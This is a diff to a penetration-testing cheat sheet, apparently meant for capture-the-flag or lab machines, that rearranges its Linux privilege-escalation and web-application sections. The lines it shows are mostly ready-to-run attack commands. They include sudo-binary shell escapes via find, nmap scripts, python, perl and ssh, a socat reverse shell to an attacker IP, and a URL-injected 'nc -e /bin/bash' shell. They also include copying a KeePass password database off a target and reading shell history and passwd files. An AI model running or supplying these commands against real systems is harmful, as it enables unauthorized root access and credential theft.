@@ -212,6 +212,13 @@ ssh -i ssh_key user@192.168.x.x
 - Make sure priv key is formatted correctly in file and has chmod 600 perms
 
 - Public key can show username though
+
+# SSH user priv download
+to download a file from kali IF you have SSH access to the machine
+
+scp -i /mnt/user_sshkey user@192.168.2.105:/folder_name/passwordsDB.kdbx .
+scp -i sshKey groundfloor@192.168.2.105:/keepass/passwordsDB.kdbx .
+
 ```
 
 ### Login Pages
@@ -317,8 +324,7 @@ curl -sv domain/api --cookie "<value>" | jq
 ```
 
 
-## Escalate Privileges
-## LINUX
+## Escalate Privileges LINUX
 
 ### -- Begin checking logged in user capabilities --
 ```
@@ -328,58 +334,77 @@ lscpu
 ls /home 
 ls /var/www/html 
 ls /var/www/
+cat .bash_history
 ```
 ----------------------------------------------------------------------------------------------------------------
 ### SUDO -L (Permissions)
+```
 EXAMPLE OUTPUT:
-```
+
 find / -perm -u=s -type f 2>/dev/null
-```
-```
+
+
 #(root) NOPASSWD: /usr/bin/find
 #(root) NOPASSWD: /usr/bin/nmap
 #(root) NOPASSWD: /usr/bin/env
 #(root) NOPASSWD: /usr/bin/vim
 #(root) NOPASSWD: /usr/bin/awk
 #(root) NOPASSWD: /usr/bin/perl
-```
-```
-USE https://gtfobins.github.io/gtfobins/php/
-```
+
+https://gtfobins.github.io/gtfobins/php/
+
 ### IF FIND (/usr/bin/find)
-```
+
 sudo find / etc/passwd -exec /bin/bash \;
 find . -exec chmod -R 777 /root \;
 find . -exec usermod -aG sudo user \;
 sudo find /home -exec /bin/bash \;
-```
+
 ### IF PHP (/usr/bin/php)
-```
+
 sudo -u user_name php -r "system('/bin/sh');"
-```
+
 ### IF NMAP
-```
+
 echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
 sudo nmap --interactive > !sh
-```
+
 ### IF SOCAT
-```
+
 Attacker = socat file:`tty`,raw,echo=0 tcp-listen:1234
 Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
-```
+
 ### IF MYSQL
-```
+
 sudo mysql -e '\! /bin/sh'
-```
+
 ### IF SSH
-```
+
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
-```
+
 ### IF /usr/bin/python
-```
+
 sudo python -c 'import pty;pty.spawn("/bin/bash")'
 sudo python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+IF /usr/bin/Perl
+sudo perl -e 'exec "/bin/bash";'
+
 ```
+### Backup File
+```Navigate to user directory and use ls -lah in backup files to find readable items
+# Look for;
+- processes run as root
+- hashed passwords
+- any processes that give you root access after running
+```
+
+### Run NMAP as root permissions
+```
+echo "os.execute('/bin/sh')">/tmp/root.nse
+sudo nmap --script=/tmp/root.nse
+```
+
 ### /usr/bin/python hijacking
 ```
 (root) SETENV: NOPASSWD: /usr/bin/python3 /home/user/python_script.py
@@ -396,33 +421,12 @@ nc -lnvp 1234
 sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/user/python_script.py (which includes example.py library)
 //The PYTHONPATH environment variable indicates a directory (or directories), where Python can search for modules to import.
 ```
-### IF /usr/bin/Perl
-```
-sudo perl -e 'exec "/bin/bash";'
-```
-More at https://github.com/gurkylee/Linux-Privilege-Escalation-Basics#absuing-sudo-binaries-to-gain-root
-
-### SSH user priv download
-```
-to download a file from kali IF you have SSH access to the machine
-
-scp -i /mnt/user_sshkey user@192.168.2.105:/folder_name/passwordsDB.kdbx .
-scp -i sshKey groundfloor@192.168.2.105:/keepass/passwordsDB.kdbx .
-```
 
 
 -------------------------------------------------------------------------------------------------------------------------------------
 ### Web Applications
 - Remember to check service version and use https://www.exploit-db.com/ to find vulnerabilities
 -  Version is usually found using the -sV flag on nmap or IF it has a webpage hosting a CMS, check the webpage for the version running.
-
-### Backup File
-```Navigate to user directory and use ls -lah in backup files to find readable items
-# Look for;
-- processes run as root
-- hashed passwords
-- any processes that give you root access after running
-```
 
 ### tcpdump credentials
 ```
@@ -505,6 +509,8 @@ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ### Kernel Exploits
 ```
 uname -a // What OS kernel are we using?
+
+Run LINPEAS if needed
 
 // Google Search (Example): 4.4.0-116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github
 // Read the expliots and follow the instructions
@@ -661,12 +667,6 @@ http://192.168.56.125:8080/administration.php?logfile=cd /home ls
 http://192.168.56.125:8080/administration.php?logfile= chat.txt; nc IP PORT -e /bin/bash
 ```
 
-### Run NMAP as root permissions
-```
-echo "os.execute('/bin/sh')">/tmp/root.nse
-sudo nmap --script=/tmp/root.nse
-```
-
 ### Read Passwd file
 ```
 cat /etc/passwd
@@ -697,14 +697,12 @@ curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin
 ### Port forwarding based off running python app
 https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#port-2-port-2
 
-When running linpeas look for any apps that are running on a server
+```
+# When running linpeas look for any apps that are running on a server
 
-![processes](https://github.com/PellaPella/PTD-Cheatsheet/assets/73531195/2774674d-9ccd-4bf2-8523-b94f08a97352)
-
-Find the app through manual enumeration (do not have method for command yet)
+# Find the app through manual enumeration (do not have method for command yet)
 
 Port forward on victim machine
-```
 socat TCP-LISTEN:8282,fork TCP:127.0.0.1:8080 &
 ```
 
@@ -733,8 +731,7 @@ Target -> choose request -> right click -> send to repeater -> change username t
 
 
 
-## Escalate Privileges
-## WINDOWS
+## Escalate Privileges WINDOWS AND Active Directory
 
 Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed.
 ```
